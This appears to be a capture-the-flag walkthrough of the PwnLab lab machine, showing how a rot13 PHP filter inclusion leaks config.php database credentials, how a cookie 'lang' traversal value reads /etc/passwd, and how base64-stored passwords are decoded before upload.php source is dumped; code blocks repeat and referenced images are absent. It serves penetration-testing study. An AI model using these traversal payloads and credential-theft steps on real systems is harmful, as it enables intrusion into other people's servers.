PwnLab

The web application on port 80 contains the following webpage:

The source code of the web application contains shows the webpage is using a parameter called page:

<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
<hr/><br/>
    <form action="" method="POST">
    <label>Username: </label><input id="user" type="test" name="user"><br />
    <label>Password: </label><input id="pass" type="password" name="pass"><br />
    <input type="submit" name="submit" value="Login">
    </form>
    </center>
</body>
</html>
<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
<hr/><br/>
    <form action="" method="POST">
    <label>Username: </label><input id="user" type="test" name="user"><br />
    <label>Password: </label><input id="pass" type="password" name="pass"><br />
    <input type="submit" name="submit" value="Login">
    </form>
    </center>
</body>
</html>

When trying to include using normal payloads, I had no luck until I tried the rot13 filter:

As shown in the image above, the web application returned the source code of the login.php in rot13 format.

I copied the content an passed it to a rot13 decoder and obtained the following result:

As shown in the image above, there is a file called config.php which could contain the credentials.

And requesting the config.php file, I get the credentials in rot13 format:

After decoding the credentials in rot13 format, I obtained the following result:

$server	  = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
$server	  = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";

However, the MySQL application does not allow me to connect which is strange:

┌──(kali㉿kali)-[~/Desktop/Labs/PwnLab]
└─$ mysql -u root -h 192.168.234.29 -P 3306 -p
Enter password: 
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1129 - Host '192.168.45.217' is blocked because of many connection errors; unblock with 'mysqladmin flush-hosts'
┌──(kali㉿kali)-[~/Desktop/Labs/PwnLab]
└─$ mysql -u root -h 192.168.234.29 -P 3306 -p
Enter password: 
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1129 - Host '192.168.45.217' is blocked because of many connection errors; unblock with 'mysqladmin flush-hosts'

When investigating the source code of index.php file, I notice the lang parameter in the cookie header can be used to include files:

And using technique above, I managed to successfully include the /etc/passwd file:

As shown in the image above, the lang parameter is injected directly in the cookie field:

lang=../../../../../../../etc/passwd
lang=../../../../../../../etc/passwd

Observing the content of /etc/passwd shows four usernames:

john
kent
mike
kane
john
kent
mike
kane

After resetting the box, I gained access to the MySQL instance using the credentials obtained inside the config.php file:

┌──(kali㉿kali)-[~/Desktop/Labs/PwnLab]
└─$ mysql -u root -h 192.168.234.29 -P 3306 -p                                
Enter password: 
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
                                                                                                                                                                         
┌──(kali㉿kali)-[~/Desktop/Labs/PwnLab]
└─$ mysql -u root -h 192.168.234.29 -P 3306 -p --ssl-verify-server-cert=false 
Enter password:

Your MySQL connection id is 39

+--------------------+
2 rows in set (0.008 sec)

MySQL [Users]>

The passwords are hashed in base64. Decode the hash of user kane to obtain the password iSv5Ym2GRo:

┌──(kali㉿kali)-[~/Desktop/Labs/PwnLab]
└─$ echo "aVN2NVltMkdSbw==" | base64 -d 
iSv5Ym2GRo 
┌──(kali㉿kali)-[~/Desktop/Labs/PwnLab]
└─$ echo "aVN2NVltMkdSbw==" | base64 -d 
iSv5Ym2GRo

Now we can login to the web application using the new set of credentials kane:iSv5Ym2GRo:

As shown in the image above, now I have access to a file upload feature.

Using the directory traversal vulnerability, I read the source code of upload.php. The source code I obtained is the following:

<?php
session_start();
if (!isset($_SESSION['user'])) { die('You must be log in.'); }
?>
<html>
    <body>
        <form action='' method='post' enctype='multipart/form-data'>
            <input type='file' name='file' id='file' />
            <input type='submit' name='submit' value='Upload'/>
        </form>
    </body>
</html>
<?php 
if(isset($_POST['submit'])) {
    if ($_FILES['file']['error'] <= 0) {
        $filename  = $_FILES['file']['name'];
        $filetype  = $_FILES['file']['type'];
        $uploaddir = 'upload/';
        $file_ext  = strrchr($filename, '.');
        $imageinfo = getimagesize($_FILES['file']['tmp_name']);
        $whitelist = array(".jpg",".jpeg",".gif",".png"); 

        if (!(in_array($file_ext, $whitelist))) {
            die('Not allowed extension, please upload images only.');
        }

        if(strpos($filetype,'image') === false) {
            die('Error 001');
        }

        if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
            die('Error 002');
        }

        if(substr_count($filetype, '/')>1){
            die('Error 003');
        }

        $uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;

        if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
            echo "<img src=\"".$uploadfile."\"><br />";
        } else {
            die('Error 4');
        }
    }
}

?></pragre>
<?php
session_start();
if (!isset($_SESSION['user'])) { die('You must be log in.'); }
?>
<html>
    <body>
        <form action='' method='post' enctype='multipart/form-data'>
            <input type='file' name='file' id='file' />
            <input type='submit' name='submit' value='Upload'/>
        </form>
    </body>
</html>
<?php 
if(isset($_POST['submit'])) {
    if ($_FILES['file']['error'] <= 0) {
        $filename  = $_FILES['file']['name'];
        $filetype  = $_FILES['file']['type'];
        $uploaddir = 'upload/';
        $file_ext  = strrchr($filename, '.');
        $imageinfo = getimagesize($_FILES['file']['tmp_name']);
        $whitelist = array(".jpg",".jpeg",".gif",".png"); 

        if (!(in_array($file_ext, $whitelist))) {
            die('Not allowed extension, please upload images only.');
        }

        if(strpos($filetype,'image') === false) {
            die('Error 001');
        }

        if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
            die('Error 002');
        }

        if(substr_count($filetype, '/')>1){
            die('Error 003');
        }

        $uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;

        if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
            echo "<img src=\"".$uploadfile."\"><br />";
        } else {
            die('Error 4');
        }
    }
}

?></pragre>
